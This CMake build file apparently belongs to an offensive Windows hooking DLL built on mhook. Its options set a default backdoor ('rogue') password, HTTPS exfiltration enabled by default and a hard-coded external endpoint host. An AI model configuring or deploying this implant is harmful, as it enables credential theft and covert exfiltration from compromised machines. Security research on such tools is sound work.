cmake_minimum_required(VERSION 3.8.2) # 3.8.0 is minimum version that allow Linux remote building and debugging

project(ouiouibaguette)

set(CMAKE_SYSTEM_NAME "Windows")
set(CMAKE_SYSTEM_PROCESSOR "x86_64")
set(CMAKE_SHARED_LIBRARY_PREFIX "")


# Remove trailing '\' and '/' at the end of the path, so can reliably compare
STRING(REGEX REPLACE "[/\\]+$" "" CMAKE_SOURCE_DIR ${CMAKE_SOURCE_DIR})
STRING(REGEX REPLACE "[/\\]+$" "" CMAKE_CURRENT_SOURCE_DIR ${CMAKE_CURRENT_SOURCE_DIR})

# Define Paths
set(SRC_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src")
set(INCLUDE_DIR "${CMAKE_CURRENT_SOURCE_DIR}/include")
set(EXTERNAL_DIR "${CMAKE_CURRENT_SOURCE_DIR}/external")
set(MHOOK_DIR "${EXTERNAL_DIR}/mhook")

# Automatically collect all C source files from the src and mhook subdirectories.
# CONFIGURE_DEPENDS ensures that adding new files triggers a re-run of CMake.
file(GLOB_RECURSE SRC_FILES CONFIGURE_DEPENDS 
    "${SRC_DIR}/*.c"
)

file(GLOB_RECURSE EXT_SOURCE_FILES CONFIGURE_DEPENDS
    "${MHOOK_DIR}/mhook-lib/*.c"
    "${MHOOK_DIR}/disasm-lib/*.c"
)


add_library(ouiouibaguette SHARED ${SRC_FILES} ${EXT_SOURCE_FILES})

# set dll extention
set_target_properties(ouiouibaguette PROPERTIES SUFFIX ".dll")
target_compile_options(ouiouibaguette PRIVATE -Wall -Wextra -Wpedantic)
#include directory
target_include_directories(ouiouibaguette PRIVATE
    "${INCLUDE_DIR}"
    "${MHOOK_DIR}/mhook-lib"
    "${MHOOK_DIR}/disasm-lib"
)

if(NOT DEFINED DEBUG)
  set(DEBUG "true" CACHE STRING "Debug flag (true/false)")
endif()

if(NOT DEFINED ROGUE_PASSWORD)
  set(ROGUE_PASSWORD "OuiOuiBaguette" CACHE STRING "Rogue password")
endif()

if(NOT DEFINED HTTPS_EXFILTRATION)
  set(HTTPS_EXFILTRATION 1 CACHE STRING "Enable HTTPS exfiltration (1 to enable)")
endif()

if(NOT DEFINED HTTPS_ENDPOINT)
  set(HTTPS_ENDPOINT "miammiam.kleman.pw" CACHE STRING "HTTPS endpoint URL")
endif()

if(NOT DEFINED USERAGENT)
  set(USERAGENT "OUIOUI BAGUETTE" CACHE STRING "User agent string")
endif()


# Pass configuration variables as compile definitions.
# Note that HTTPS_ENDPOINT is defined as a string literal.
target_compile_definitions(ouiouibaguette PRIVATE
    DEBUG=\"${DEBUG}\"
    ROGUE_PASSWORD=\"${ROGUE_PASSWORD}\"
    HTTPS_EXFILTRATION=${HTTPS_EXFILTRATION}
    HTTPS_ENDPOINT=\"${HTTPS_ENDPOINT}\"
    USERAGENT=\"${USERAGENT}\"
)

target_link_libraries(ouiouibaguette PRIVATE winhttp)